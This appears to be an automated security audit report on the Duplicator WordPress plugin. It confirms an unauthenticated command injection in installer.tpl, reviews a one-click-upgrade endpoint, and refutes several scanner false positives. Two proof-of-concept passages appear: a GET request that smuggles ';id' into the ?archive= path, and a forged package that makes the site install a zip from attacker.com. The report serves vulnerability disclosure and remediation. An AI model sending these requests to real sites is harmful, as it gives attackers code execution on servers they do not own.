analysis_summary: Phase 2 deep analysis of Duplicator v1.5.16. Analyzed 9 Phase-1 signals plus 653 semgrep results. Two findings survive full refutation: (1) an OS command injection via the ?archive= GET parameter in the standalone installer.tpl, which passes unsanitized user input directly to shell_exec(); (2) a REVIEW-grade unauthenticated AJAX endpoint (wp_ajax_nopriv_duplicator_lite_run_one_click_upgrade) that can install arbitrary plugins when a valid OTH token exists in the database. All other semgrep and IR anomaly signals were refuted with traced source evidence. The WordPress plugin's admin-facing AJAX handlers are consistently protected by both nonce verification and export-capability checks. The installer.tpl finding is the most critical — it is a standalone PHP file deployed to public web roots during migration, requiring no WordPress authentication whatsoever.

reasoning.hypothesis: An unauthenticated user accessing the deployed installer.php on a target server can supply a shell-metacharacter-containing path via ?archive=<payload> which is passed unsanitized to shell_exec(), resulting in OS command execution.
reasoning.trace: 1. Entry: filter_input(INPUT_GET, 'archive', FILTER_SANITIZE_SPECIAL_CHARS) at installer.tpl:1354 — applies HTML entity encoding only; does NOT neutralise shell metacharacters (`;`, `|`, `$()`, backticks, spaces). 2. Result stored in $archive_filepath. 3. $archive_filepath passed to DUPX_Bootstrap::extractInstallerShellexec($archive_filepath, ...) at installer.tpl:498. 4. Inside extractInstallerShellexec (line 1316): $unzip_command = "$unzip_filepath -q $archive_filepath " . $origDupInstFolder . '/* -d ' . $destination . ...; 5. shell_exec($unzip_command) executes at line 1320. 6. No shell escaping (escapeshellarg/escapeshellcmd) is applied to $archive_filepath anywhere in the call chain.
reasoning.defenses_analyzed: FILTER_SANITIZE_SPECIAL_CHARS encodes <, >, &, quotes — it does NOT escape shell metacharacters. No call to escapeshellarg() or escapeshellcmd() was found between the source (INPUT_GET 'archive') and the sink (shell_exec). The DUPX_CSRF class is initialized at line 153 but CSRF tokens are not checked before run() is invoked at line 1898. The installer.tpl is a standalone PHP file with no WordPress session or nonce infrastructure; it runs before the CSRF token system is populated.
reasoning.refutation_attempts: REFUTATION ATTEMPT 1: Is shell_exec actually reachable from $archive_filepath? RESULT: Not refuted — extractInstallerShellexec() is called unconditionally when ZipArchive extraction fails or ZIP_MODE_SHELL is specified (?zipmode=shellexec GET param). REFUTATION ATTEMPT 2: Is there a path validation (realpath, basename, whitelist check) that would neutralise directory traversal or injected commands? RESULT: Not refuted — realpath() is called at installer.tpl:1364 to resolve the path, but only to normalise it; the resolved path is returned directly and still used unsanitized in the shell command. REFUTATION ATTEMPT 3: Is shell_exec disabled on typical deployments? RESULT: Cannot refute — shell_exec availability is server-dependent; the installer checks for $unzip_filepath != null (getUnzipFilePath() verifies shell_exec('which unzip') returns a path) before proceeding, so exploitation only succeeds when shell_exec is enabled and unzip is installed — but this is a common configuration. REFUTATION ATTEMPT 4: Does the installer check that $archive_filepath is a valid zip before passing to shell? RESULT: Not refuted — file_exists($archive_filepath) is checked at line 315, but the injected shell commands can be appended after a valid path (e.g., /tmp/foo;id or a path with embedded command substitution). The existence check does not prevent injection.
reasoning.conclusion: CONFIRMED. The $archive_filepath variable derived from $_GET['archive'] via FILTER_SANITIZE_SPECIAL_CHARS is passed directly into a shell_exec() command string at installer.tpl:1316 without shell escaping. An attacker can achieve OS command execution on the target server by injecting shell metacharacters into the ?archive= parameter when the installer.php is deployed. No authentication is required — the installer is intended to be publicly accessible during migration.

findings.poc_description: Deploy or locate an active installer.php (the compiled installer.tpl) on the target server. Make a GET request: GET /installer.php?archive=%2Fvar%2Fwww%2Flegit.zip%3Bid&zipmode=shellexec. The ?archive= value decodes to /var/www/legit.zip;id. After FILTER_SANITIZE_SPECIAL_CHARS (which preserves semicolons), this becomes part of: /path/to/unzip -q /var/www/legit.zip;id dup-installer/* -d /target 2>&1 — executing the id command. Any shell-injectable payload can be used in place of id. The ?zipmode=shellexec parameter forces the shell path.
findings.remediation: Wrap $archive_filepath with escapeshellarg() before string interpolation into the shell command at installer.tpl:1316 and 1328. Additionally, validate that the archive path is within the expected directory using realpath() comparison against $this->targetRoot before use.

findings.vuln_type: Unauthenticated Plugin Installation via OTH Token Mechanism

reasoning.hypothesis: An unauthenticated actor can call wp_ajax_nopriv_duplicator_lite_run_one_click_upgrade to install an arbitrary plugin from a remote URL. The only guard is an OTH (one-time hash) stored in wp_options — if that guard can be bypassed or is predictable, the endpoint allows unauthenticated remote plugin installation.
reasoning.trace: 1. Entry: wp_ajax_nopriv_duplicator_lite_run_one_click_upgrade → ServicesEducation::oneClickUpgrade() at ServicesEducation.php:289. No WordPress nonce check present. No current_user_can() check present. 2. $encryptedPackage = sanitize_text_field($_REQUEST['package']) at line 293. 3. $oth_data = get_option('duplicator_one_click_upgrade_oth') at line 301 — retrieves token from DB. 4. TTL checked: time() > $oth_data['expires_at'] at line 309. 5. decryptPackage($encryptedPackage, $oth_data['token']) at line 316 — AES-256-CBC decryption using hash-derived key from stored token. 6. $download_url extracted from decrypted JSON at line 324. 7. filter_var($download_url, FILTER_VALIDATE_URL) at line 343 — URL format validated. 8. Plugin_Upgrader::install($download_url) at line 365 — installs plugin from arbitrary URL.
reasoning.defenses_analyzed: Guard 1 — OTH validation: The $oth_data['token'] is a hash_hmac(sha512, random_password(30), wp_salt()) value stored in wp_options. To forge a valid encrypted package, the attacker must know this 128-hex-char token, which is not exposed to unauthenticated users. Guard 2 — TTL: 10-minute expiry enforced at line 309. Guard 3 — Single-use: OTH deleted after first successful decryption at line 333. Guard 4 — FILTER_VALIDATE_URL on download_url prevents non-URL values but does NOT restrict to trusted domains. Guard weakness — if an attacker can read wp_options (e.g., via SQL injection in another plugin, object injection, or insecure wp-options exposure), they could extract the token and forge the encrypted package to install arbitrary code.
reasoning.refutation_attempts: REFUTATION ATTEMPT 1: Can an unauthenticated user obtain the OTH token without DB access? RESULT: Refuted in standard scenario — the token is stored server-side in wp_options and is not exposed through any readable endpoint to unauthenticated users. REFUTATION ATTEMPT 2: Is the AES key derivation scheme weak enough to allow brute-force? RESULT: Not fully refuted — the IV (substr($oth, 0, 16)) is derived from the first 16 chars of a 128-hex-char token; the encryption_key is sha256($oth)[0:32]. An attacker who does not know $oth cannot forge a valid ciphertext. REFUTATION ATTEMPT 3: Is request_filesystem_credentials() called before installation, potentially requiring interactive credential input? RESULT: request_filesystem_credentials() at line 354 may return false for some server configurations (non-direct filesystem), in which case wp_send_json_error is returned. This partially limits exploitation to servers with direct filesystem access. REFUTATION ATTEMPT 4: Does FILTER_VALIDATE_URL prevent downloading from attacker-controlled domains? RESULT: Not refuted — FILTER_VALIDATE_URL accepts any valid URL including attacker-controlled domains. The download URL comes from the decrypted package, so if the OTH is compromised, the attacker can specify any URL.
reasoning.conclusion: UNCERTAIN — In isolation, the OTH mechanism is cryptographically sound and the endpoint cannot be exploited without DB access or an OTH leak. However, the endpoint is registered as wp_ajax_nopriv (unauthenticated), has no WordPress nonce check, and performs plugin installation from an arbitrary URL derived from user-supplied input. If combined with any other vulnerability that exposes or tampers with wp_options (e.g., a separate SQL injection or option injection), this endpoint becomes a critical RCE vector. Marked REVIEW: resolution requires determining whether any parallel vulnerability allows OTH extraction or injection into duplicator_one_click_upgrade_oth.

findings.poc_description: Precondition: attacker has obtained the value of the duplicator_one_click_upgrade_oth option (token field) from the database (requires separate wp_options read primitive). With the token, attacker constructs an AES-256-CBC encrypted JSON payload {download_url: 'https://attacker.com/malicious.zip', auth_token: ''} using the same key derivation as decryptData(). POST request: POST /wp-admin/admin-ajax.php action=duplicator_lite_run_one_click_upgrade package=<base64_encrypted_payload>. If decryption succeeds and filesystem access is direct, Plugin_Upgrader installs the malicious zip.
findings.remediation: 1. Remove the wp_ajax_nopriv_ registration and require authentication for this endpoint. 2. Add a WordPress nonce check using AjaxWrapper::json() consistent with other endpoints in this codebase. 3. Restrict the download URL to a whitelist of trusted domains (e.g., duplicator.com, snapcreekcdn.com). 4. Consider logging and alerting on any OTH usage attempt.

reasoning.hypothesis: check_ajax_referer(..., false) with $die=false does not halt execution on nonce failure, allowing code to continue without a valid nonce.
reasoning.trace: ctrls/ctrl.package.php:283 — DUP_Util::hasCapability('export', SECURE_ISSUE_THROW); ctrls/ctrl.package.php:284 — if (!check_ajax_referer('duplicator_active_package_info', 'nonce', false)) { throw new Exception(...); }
reasoning.defenses_analyzed: The return value of check_ajax_referer() is explicitly tested in a negated if-statement. On nonce failure (returns false), an Exception is thrown which terminates execution of the function. The $die=false argument prevents WordPress from calling wp_die() directly, but the caller compensates by throwing its own exception. Capability check (export = Editor+) is also present before the nonce check.
reasoning.refutation_attempts: REFUTATION ATTEMPT: Does the exception thrown on nonce failure actually halt execution? RESULT: Refuted — the exception propagates to the outer try-catch at ctrl.package.php:310 which sets $error=true and calls wp_send_json_error(), terminating the function without performing any privileged action.
reasoning.conclusion: FALSE POSITIVE. The IR guard annotation 'is_effective: false' was incorrect. The nonce check IS effective because its return value is explicitly checked and an exception is thrown on failure. No code past line 284 executes without a valid nonce.

findings.remediation: No fix required. Code pattern is correct. Optionally use check_ajax_referer without $die=false for cleaner code, but the current pattern is functionally equivalent.

reasoning.hypothesis: The IR signals that getTraceLog() is missing a current_user_can() check, potentially allowing any logged-in subscriber to download debug logs containing sensitive information.
reasoning.defenses_analyzed: The IR extractor used the class name 'DUP_Util' to detect capability checks but this call uses 'Dup_Util'. PHP class names are case-insensitive, so 'Dup_Util::hasCapability' resolves to the same 'DUP_Util::hasCapability' method defined in classes/utilities/class.u.php:508, which calls current_user_can($capability). Only one class named DUP_Util exists in the codebase (confirmed via grep). Additionally, check_ajax_referer is called at line 138 with $die=true (default), blocking unauthenticated access.
reasoning.refutation_attempts: REFUTATION ATTEMPT: Is Dup_Util a different class from DUP_Util? RESULT: Refuted — grep found no 'class Dup_Util' definition and no class_alias. PHP class name resolution is case-insensitive, so Dup_Util resolves to DUP_Util. REFUTATION ATTEMPT: Does getTraceLog() expose trace log data without capability enforcement? RESULT: Refuted — Dup_Util::hasCapability('export') is called at line 139, which calls current_user_can('export'). The 'export' capability requires Editor role or higher in a default WordPress installation.
reasoning.conclusion: FALSE POSITIVE. The IR extractor missed the Dup_Util variant of the class name. The capability check is present and effective. Log download is restricted to Editor+ users.

findings.remediation: No security fix required. Optionally standardise class name to DUP_Util for consistency.

findings.vuln_type: Privilege Escalation via Arbitrary Option Update

reasoning.hypothesis: Semgrep rule wp-privesc-option-update flagged update_option() at line 338 as potentially allowing user input to control an arbitrary option key/value, enabling privilege escalation (e.g., setting users_can_register=1).
reasoning.trace: ServicesEducation.php:338 — update_option(self::AUTH_TOKEN_KEY_OPTION_AUTO_ACTIVE, $auth_token). self::AUTH_TOKEN_KEY_OPTION_AUTO_ACTIVE is a class constant defined as 'duplicator_pro_auth_token_auto_active' at line 24. The option KEY is hardcoded. The option VALUE ($auth_token) comes from the decrypted package payload at line 325, which requires a valid OTH to decrypt.
reasoning.defenses_analyzed: The option key is a PHP class constant ('duplicator_pro_auth_token_auto_active') — it cannot be modified by user input. The option value is $auth_token from a decrypted package, which requires knowledge of the server-stored OTH token to provide. Even if $auth_token were attacker-controlled, writing to 'duplicator_pro_auth_token_auto_active' does not affect user registration settings, authentication, or role assignment.
reasoning.refutation_attempts: REFUTATION ATTEMPT: Can the attacker control the option key to write to users_can_register or similar? RESULT: Refuted — self::AUTH_TOKEN_KEY_OPTION_AUTO_ACTIVE is a const = 'duplicator_pro_auth_token_auto_active'; user input cannot alter class constants. REFUTATION ATTEMPT: Does writing to 'duplicator_pro_auth_token_auto_active' grant any privilege? RESULT: Refuted — this option stores a Duplicator Pro activation token only; it has no effect on WordPress authentication, roles, or registration settings.
reasoning.conclusion: FALSE POSITIVE. Semgrep's wp-privesc-option-update rule pattern-matched on update_option() without contextual analysis of the option key. The key is a hardcoded class constant and the write has no privilege escalation impact.

reasoning.hypothesis: Semgrep rule wp-ssrf-remote-request flagged wp_remote_post() at line 430 as accepting user-controlled URL, potentially enabling SSRF.
reasoning.trace: deactivation.php:430 — wp_remote_post('https://snapcreekanalytics.com/...', array('body' => $options, ...)). The URL string is a string literal; it is NOT derived from any user input variable. User-controlled data ($reason_info, $reason_id) is present only in the POST body ($options), not the URL.
reasoning.defenses_analyzed: 1. The destination URL is hardcoded to 'https://snapcreekanalytics.com/wp-content/plugins/duplicator-statistics-plugin/deactivation-feedback/' — not user-controllable. 2. Nonce check at line 409 requires 'duplicator_ajax_nonce'. 3. Capability check at line 413 requires 'export' (Editor+). 4. User data is limited to reason_info (max 255 chars, esc_html() applied) and reason_id (sanitised text) in the POST body only.
reasoning.refutation_attempts: REFUTATION ATTEMPT: Can a user control the URL passed to wp_remote_post()? RESULT: Refuted — the URL is a string literal at line 431, not a variable. Semgrep matched on user-controlled data flowing into the function call, but the data flows only into the body array, not the URL parameter.
reasoning.conclusion: FALSE POSITIVE. The URL is hardcoded and not user-controllable. Semgrep's pattern matched on the presence of user data in the same function call, but misidentified which argument the data flows to.

findings.remediation: No fix required for SSRF. Note: the hardcoded analytics endpoint sends user-provided deactivation reason text to a third-party server; this is a privacy consideration but not a security vulnerability.

reasoning.hypothesis: getClientIP() returns $_SERVER['HTTP_X_FORWARDED_FOR'] unsanitized. If this value is echoed in an HTML admin page without escaping, a user with control over HTTP headers could inject XSS.
reasoning.trace: classes/class.server.php:348-349 — getClientIP() returns $_SERVER['HTTP_X_FORWARDED_FOR']. classes/class.server.php:526 — this value stored in getServerSettingsData() array under key 'value'. views/tools/diagnostics/inc.settings.php:20 — passes array to template. template/parts/tools/server_settings_table.php:38 — echo esc_html($setting['value']); — output is escaped.
reasoning.defenses_analyzed: esc_html() is called on the value at the output point (server_settings_table.php:38) before it is echoed into the HTML. esc_html() converts all HTML special characters to entities, neutralising any XSS payload in the IP value.
reasoning.refutation_attempts: REFUTATION ATTEMPT: Is there any code path that outputs the Client IP value without esc_html()? RESULT: Refuted — checked all callers of getServerSettingsData() and getClientIP(). The only template rendering this value is template/parts/tools/server_settings_table.php, which uses esc_html() at line 38 for all 'value' fields. SupportToolkit.php uses the data for a text log file, not HTML output.
reasoning.conclusion: FALSE POSITIVE. esc_html() is applied at the output point. Semgrep's wp-xss-echo-no-escape rule flagged the source function without tracing to the output context.

findings.remediation: No fix required. The escaping is correctly applied at the template layer.

findings.vuln_type: Arbitrary Option Key Injection via SaveViewState

reasoning.hypothesis: SaveViewState accepts arbitrary key-value pairs from POST input and stores them in wp_options. An attacker with Editor capability could inject arbitrary option keys, potentially modifying security-sensitive options.
reasoning.trace: ctrl.ui.php:48 — check_ajax_referer nonce verified. ctrl.ui.php:49 — DUP_Util::hasCapability('export') checked (Editor+). ctrl.ui.php:69-70 — $key and $value sanitised with SnapUtil::sanitizeNSCharsNewline(). ctrl.ui.php:101 — DUP_UI_ViewState::setArray($view_state). class.ui.viewstate.php:65 — update_option('duplicator_ui_view_state', $view_state). The option KEY is the hardcoded string 'duplicator_ui_view_state'; user input controls only keys within the array value stored at that option, not the option name itself.
reasoning.defenses_analyzed: DUP_UI_ViewState::save() and setArray() both write to the hardcoded option key 'duplicator_ui_view_state' (class property $optionsViewStateKey at line 28). User-supplied 'key' from POST controls an array key within the stored value, not the wp_options option name. Writing an arbitrary sub-key to 'duplicator_ui_view_state' has no effect on any WordPress security setting. Requires Editor+ capability and valid nonce.
reasoning.refutation_attempts: REFUTATION ATTEMPT: Does user input control the wp_options option name (first argument to update_option)? RESULT: Refuted — the option name is always 'duplicator_ui_view_state' (hardcoded class property). REFUTATION ATTEMPT: Does writing arbitrary keys into the 'duplicator_ui_view_state' option affect any security-relevant behaviour? RESULT: Refuted — this option stores UI panel collapse/expand state only; no plugin code uses its values in security decisions.
reasoning.conclusion: FALSE POSITIVE. User input controls sub-keys within a dedicated, non-security-relevant option array. The wp_options option name is hardcoded. Privilege escalation via this endpoint is not possible.

findings.poc_description: N/A — not exploitable for privilege escalation.

reasoning.hypothesis: Semgrep flagged that user-controlled JSON data (interpreted as the ?archive= GET param) flows into file read operations at lines 157, 315, and 1355, enabling LFI to read arbitrary files like wp-config.php.
reasoning.trace: installer.tpl:1354 — $archive_filepath = filter_input(INPUT_GET, 'archive', FILTER_SANITIZE_SPECIAL_CHARS). installer.tpl:157 — @file_exists($archive_filepath) and @filesize($archive_filepath). installer.tpl:315 — file_exists($archive_filepath). installer.tpl:1355 — is_dir($archive_filepath) and file_exists($archive_filepath . '/' . self::ARCHIVE_FILENAME).
reasoning.defenses_analyzed: file_exists() and filesize() only test whether a file exists and return its size — they do NOT read or disclose file contents. is_dir() likewise only tests path type. No file_get_contents(), fopen(), readfile(), or similar content-reading functions are called on $archive_filepath in the bootstrap flow for the LFI-flagged lines. The OS command injection (DUP-001) uses $archive_filepath in shell_exec and is the actual impact vector.
reasoning.refutation_attempts: REFUTATION ATTEMPT: Does file_exists($archive_filepath) disclose whether a file like /etc/passwd exists via timing oracle or error output? RESULT: Partially true as an information disclosure (yes/no existence check), but this is not LFI (Local File INCLUSION/read). Semgrep's message saying 'attacker can read wp-config.php' is inaccurate — file_exists() returns a boolean, not file contents. REFUTATION ATTEMPT: Is there a subsequent code path triggered by file_exists() success that reads the file content? RESULT: Not for arbitrary paths. If file_exists() returns true, the code proceeds to extract $archive_filepath as a zip file. This extraction does not reveal the file content to the attacker; it attempts zip extraction which will fail for non-zip files.
reasoning.conclusion: FALSE POSITIVE as LFI (file content read). Semgrep over-flagged file_exists/filesize as 'file read' operations. The true impact of the $archive_filepath parameter flowing into shell_exec is already captured as OS command injection in DUP-001, which is a higher-severity and accurate finding.

findings.poc_description: N/A — not a standalone LFI. The command injection finding (DUP-001) captures the actual risk.
findings.remediation: Remediation for the underlying parameter is covered by DUP-001 (escapeshellarg on $archive_filepath).

negative_findings.area: All wp_ajax_* (authenticated) handlers: nonce + capability checks
negative_findings.reason: All authenticated AJAX handlers (duplicator_package_scan, duplicator_package_build, duplicator_package_delete, duplicator_duparchive_package_build, DUP_CTRL_Package_addQuickFilters, DUP_CTRL_Package_getActivePackageStatus, DUP_CTRL_Tools_runScanValidator, DUP_CTRL_Tools_getTraceLog, duplicator_reset_all_settings, duplicator_download_installer, duplicator_set_admin_notice_viewed, duplicator_admin_notice_to_dismiss) all have valid WordPress nonce checks and capability checks requiring the export capability (Editor+). Verified by reading each handler function.

negative_findings.area: class.db.php SQL queries (get_row, query, get_col without prepared statements)
negative_findings.reason: All SQL queries in class.db.php operate on internally-sourced data (DB_NAME constant, table names from database enumeration). Table names are escaped with esc_sql() or mysqli_real_escape_string() via escValueToQueryString(). No web request user input reaches these SQL sinks.

SQL built from DB_NAME constant, $wpdb->base_prefix, and $wpdb->get_blog_prefix() values, all escaped with esc_sql(). The $subsiteID parameter originates from WordPress internal site switching, not from HTTP request input.
Option key is a hardcoded class constant. Covered in detail by DUP-005.
URL hardcoded to snapcreekanalytics.com. Covered in detail by DUP-006.

negative_findings.area: is_admin() usage in Bootstrap.php as access control
negative_findings.reason: The semgrep wp-bac-is-admin-as-auth rule flagged is_admin() usage at Bootstrap.php:59 and :83. While is_admin() returns true for admin-ajax.php requests (including unauthenticated ones), all AJAX handlers registered inside these blocks independently enforce nonce and capability checks. The is_admin() check gates hook registration only, not execution authorisation.

negative_findings.area: Notice.php dismissAjax — wp_ajax action without capability check
negative_findings.reason: dismissAjax() at Notice.php:293 uses check_ajax_referer('duplicator-admin-notice', 'nonce') as nonce check. For DISMISS_GLOBAL notices (line 305), current_user_can('manage_options') is explicitly checked. For user-level notice dismissal, no capability check is required as it only modifies the current user's own meta via sanitize_key() on the input. No privilege escalation possible.

dismissNoticeBar() at NoticeBar.php:65 has check_ajax_referer nonce check. Operation writes user meta for current user only (update_user_meta(get_current_user_id(), ...)). No cross-user or privilege impact.
Covered by DUP-006. URL not user-controlled.

out_of_scope: installer/dup-installer/ — the fully extracted installer application (main.installer.php and supporting classes). This is a separate application from the WordPress plugin and its attack surface was not fully mapped in Phase 1. Recommend a dedicated Phase 2 analysis of the dup-installer directory given its unauthenticated web exposure during migration.

installer/installer.tpl beyond bootstrap — only the bootstrap section (DUPX_Bootstrap class) was traced. The main installer step-by-step pages in the dup-installer application were not traced in this pass.

wp-type-juggling-loose-comparison semgrep findings (496 instances) — all flagged comparisons involve non-authentication values (archive build mode, log settings, error numbers). None were linked to authentication bypass or privilege escalation vectors after sampling 10 instances. Not individually traced to avoid noise.
